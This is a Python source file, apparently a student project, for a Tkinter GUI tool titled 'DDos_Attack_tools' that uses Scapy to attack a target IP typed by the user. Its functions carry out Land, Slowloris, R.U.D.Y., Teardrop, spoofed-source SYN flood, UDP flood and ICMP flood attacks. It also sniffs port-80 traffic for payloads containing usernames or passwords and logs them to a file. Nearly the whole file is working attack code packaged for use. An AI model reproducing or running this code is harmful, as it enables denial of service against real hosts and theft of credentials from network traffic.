import tkinter
from tkinter import *
from scapy.all import *
import threading
import socket
import sys
import time
import string
import random

class GUIMODE():
    def __init__(self):
        win = tkinter.Tk()

        win.title("DDos_Attack_tools")
        win.configure(bg='white')
        win.geometry("800x600")
        win.resizable(False, False)

        right_frame = tkinter.Frame(win, relief="raised", bd=1)
        left_frame = tkinter.Frame(win, relief="raised", bd=1)

        right_frame.pack(side="right", fill="both", expand=True)
        left_frame.pack(side="left", fill="both", expand=True)

        self.ip_dst_data = tkinter.StringVar()

        textbox = Entry(left_frame, width=20, textvariable=self.ip_dst_data)  # dst_IP 텍스트 공간 부여

        self.packet=Label(left_frame,width=50,height=30,text="패킷 내용:")

        dos_manual=tkinter.Text(right_frame,width=50,height=50)
        dos_manual.insert(tkinter.CURRENT,"UDP 설명\n")

        self.packet.grid(sticky='N',row=0,column=0)
        textbox.grid(sticky='sw', row=1,column=0)  # 텍스트 칸 위치 선정
        dos_manual.grid(sticky='sw')



        self.dst_port = 80
        self.s_port = RandNum(1024, 65535)  # 포트 랜덤
        self.intercount = 0  # 카운터 재기
        self.count = 5  # 몇번 반복할지 GUI 상에 설정
        self.Random = RandNum(1000, 9000)  # 무작위 설정 1000~9000
        self.s_ip = RandIP()

        Packet_write = threading.Thread(target=self.file_packet)
        Packet_write.start()



        # 버튼 위젯 생성
        land_button = Button(left_frame, text="land 공격문", command=self.land,height=1,width=15)
        slowloris_button = Button(left_frame, text="slowloris 공격문", command=self.Slowloris,height=1,width=15)
        udp_flood_button = Button(left_frame, text="udp_flood 공격문", command=self.udp_flood,height=1,width=15)
        tcp_flood_button = Button(left_frame, text="tcp_flood 공격문", command=self.tcp_flood,height=1,width=15)
        rudy_button = Button(left_frame, text="rudy 공격문", command=self.rudy,height=1,width=15)
        Teardrop_button = Button(left_frame, text="Teardrop 공격문", command=self.Teardrop,height=1,width=15)
        ICMP_button = Button(left_frame, text="ICMP 공격문", command=self._ICMP,height=1,width=15)

        #버튼 위젯 위치 선언
        land_button.grid(sticky='sw', row=2,column=0)
        rudy_button.grid(sticky='sw', row=2,column=1)
        slowloris_button.grid(sticky='sw', row=3,column=0)
        udp_flood_button.grid(sticky='sw', row=3,column=1)
        tcp_flood_button.grid(sticky='sw', row=4,column=0)
        Teardrop_button.grid(sticky='sw', row=4,column=1)
        ICMP_button.grid(sticky='sw', row=5,column=0)



        win.mainloop()


    def showPacket(self,packet):
        data = '%s' % (packet[TCP].payload)
        if 'user' in data.lower() or 'pass' in data.lower():
            print('+++[%s]: %s' % (packet[IP].dst, data))


    def sniffing(self):
        filter='tcp port 80'
        sniff(filter=filter, prn=self.showPacket, count=0)

    def file_packet(self):
        f = open("C:\\Users\\USER\\OneDrive\\바탕 화면\\packet.txt", "w")
        sys.stdout = f
        self.sniffing()

    def file_read(self):
        f = open("C:\\Users\\USER\\OneDrive\\바탕 화면\\packet.txt", "r")
        lines = f.readlines()
        for _ in range(100):
            self.packet.configure(text=lines)

    def rudy(self):
        dst_ip = self.ip_dst_data.get()
        useragents = [
            "User-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
            "Accept-language: en-US,en"
        ]

        for i in range(self.count):

            print("packet send {}".format(str(self.intercount)))

            socks = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # socket 생성
            socks.connect((dst_ip, self.dst_port))  # ip 라는 인자값에 담긴 IP와 연결하고 80번 포트로 연결

            send(bytes("Post /http/1.1\r\n", encoding="utf-8"))
            send(
                bytes("Host {}\r\n".format(dst_ip).encode("utf-8")))  # headers에 저장 되어있는 값을 인코딩 utf-8 로 번역해서 보낸다.
            send(bytes("User-agent {}\r\n".format(random.choice(useragents)).encode("utf-8")))
            send(bytes("connection Keep-alive\r\n", encoding="utf-8"))
            send(bytes("Keep-alive 900\r\n", encoding="utf-8"))
            send(bytes("content Length 10000\r\n", encoding="utf-8"))
            send(bytes("Content type application/x-www-form-urlencoded\r\n\r\n", encoding="utf-8"))
            for i in range(0, 9000):
                Random = random.choice(string.ascii_letters + string.digits).encode('utf-8')
                socks.send(Random)
            self.intercount += 1
            socks.close()

    def Teardrop(self):
        dst_ip = self.ip_dst_data.get()
        data=random.choice(string.ascii_letters + string.digits)
        for i in range(self.count):
            _id = random.choice(range(1, 65535))
            send((IP(src=self.s_ip,dst=dst_ip,id=_id,flags="MF")/UDP(sport=self.s_port,dport=self.dst_port)/((data*1420))))
            send((IP(src=self.s_ip,dst=dst_ip,id=_id,frag=130))/(data*1420))
            send((IP(src=self.s_ip,dst=dst_ip,id=_id,flags="MF",frag=350)/UDP(sport=self.s_port,dport=self.dst_port)/(data*1420)))
            send((IP(src=self.s_ip, dst=dst_ip, id=_id,flags=0, frag=520)/UDP(sport=self.s_port,dport=self.dst_port))/(data*1420))

    def Slowloris(self): # Slowloris 유주환
        dst_ip = self.ip_dst_data.get()

        # 헤더의 변수에 User-agent 사용자정보와 사용자언어를 넣었다.
        headers = [
            "User-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
            "Accept-language: en-US,en"
        ]

        # 소켓을 리스트 형식으로 선언
        sockets = []
        def setupSocket(ip):  # http 헤더
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # socket 생성
            sock.settimeout(4)  # 타임아웃 4초 설정
            sock.connect((ip, 80))  # ip 라는 인자값에 담긴 IP와 연결하고 80번 포트로 연결
            sock.send("GET /?{} HTTP/1.1\r\n".format(RandNum(0,1337)).encode("utf-8"))  # send로 http 헤더값을 전송한다. \r\n으로 줄바꿈을 시킨다.
            for header in headers:
                sock.send("{}\r\n".format(header).encode("utf-8"))  # headers에 저장 되어있는 값을 인코딩 utf-8 로 번역해서 보낸다.

            return sock  # 객체 sock 안에 저장되어있는 http헤더를 리턴



        print("Starting DoS attack on {}. Connecting to {} sockets.".format(dst_ip,self.count))

        for _ in range(self.count):
            try:  # 예외처리
                print("Socket {}".format(_))  # 소켓을 보낼때마다 몇번째인지 확인시켜준다.
                sock = setupSocket(dst_ip)  # ip를 넣고 sock 이라는 객체에 저장한다.
            except socket.error:  # 에러가 났을시 break문 실행
                break

            sockets.append(sock)  # 아까 만들었던 sockets 라는 리스트에 sock을 추가한다.

        # 해당 포트가 닫혀있거나 연결할수있는 클라이언트가 꽉차거나 에러가 나서 while 문으로 넘어간다.

        for i in range(1, self.count):
            print("Connected to {} sockets. Sending headers...".format(len(sockets)))

            for sock in list(sockets):  # sockets 객체에 저장되어있는 것들을 sock에 저장한다.
                try:
                    sock.send("X-a: {}\r\n".format(RandNum(0,4600)).encode(
                        "utf-8"))  # http 헤더로 X -a: 1~4600 까지 랜덤한 수를 전송 http 헤더를
                    # 불완전하게 전송한다.

                except socket.error:  # 에러가 났을시 sockets 안에 sock 리스트에 들어있는 값을 지운다.
                    sockets.remove(sock)

            for _ in range(self.count - len(sockets)):  # count - len(sockets) 만큼 반복문을 진행한다.
                print("Re-opening closed sockets...")  # 닫힌 소켓을 다시 여는중 이라는 출력문을 띄운다.
                try:
                    sock = setupSocket(dst_ip)  # HTTP 헤더 정보 생성
                    if sock:
                        sockets.append(sock)  # sockets 리스트 맨뒤에 sock을 추가한다.
                except socket.error:
                    break  # 에러시 break 문
        Packet_reading = threading.Thread(target=self.file_read)
        Packet_reading.start()

    def _ICMP(self):

        dst_ip = self.ip_dst_data.get()
        data = (string.ascii_letters + string.digits)*20
        for x in range(0, self.count):  # 보낼 패킷의 범위
            icmpf=IP(src=self.s_ip,dst=dst_ip)/ICMP()/(data)
            send(icmpf)  # ICMP 전송
    def land(self):   # land 김진
        dst_ip = self.ip_dst_data.get()

        i = IP(src=dst_ip, dst=dst_ip)  #보낼 패킷을 입력한 주소와 함께 넣어준다
        i.proto = 6
        tu = TCP(dport=9001, sport=9001, flags=0x002) # 지정한 포트와 syn값을 tu 변수에 넣어준다.


        for x in range(1, self.count): #count 정도의 패킷을 반복적으로 전송한다.
            self.intercount += 1
            send(i/tu/"hello word")
            print("send packet:", self.intercount) # 패킷 보냈다는 문구

        Packet_reading = threading.Thread(target=self.file_read)
        Packet_reading.start()

    def tcp_flood(self):    #tcp flood 이태서

        dst_ip = self.ip_dst_data.get()
        print("Packets are sending..") # 패킷 전송중

        i = IP(src=self.s_ip, dst=dst_ip) # 임의의 출발지 IP 생성 함수
        t = TCP(sport=self.Random, dport=self.dst_port, flags="S", seq=self.Random, window=self.Random) # 방화벽 탐지 설정 교란을 위한 무작위 숫자 추출 함수
        for Firewall_disturb in range(0, self.count):
            send(i / t, verbose=0)
            print("\nTotal packets sent: %i\n" % Firewall_disturb)
        Packet_reading = threading.Thread(target=self.file_read)
        Packet_reading.start()


    def udp_flood(self): # udp flood 정재훈
        dst_ip = self.ip_dst_data.get()
        duration = 100
        timeout = time.time() + duration
        sent = 0

        for i in range(self.count):
            if time.time() > timeout:
                break
            else:
                pass
            _ip = IP(src=RandIP(), dst=dst_ip)
            _udp = UDP(sport=self.s_port, dport=self.dst_port)
            send(_ip / _udp, verbose=0)
            sent += 1
            print("UDP_Flooding_Attack Start: " + str(
                sent) + " sent packages " + dst_ip + " At the Port " + str(self.dst_port))

        Packet_reading = threading.Thread(target=self.file_read)
        Packet_reading.start()


application=GUIMODE()
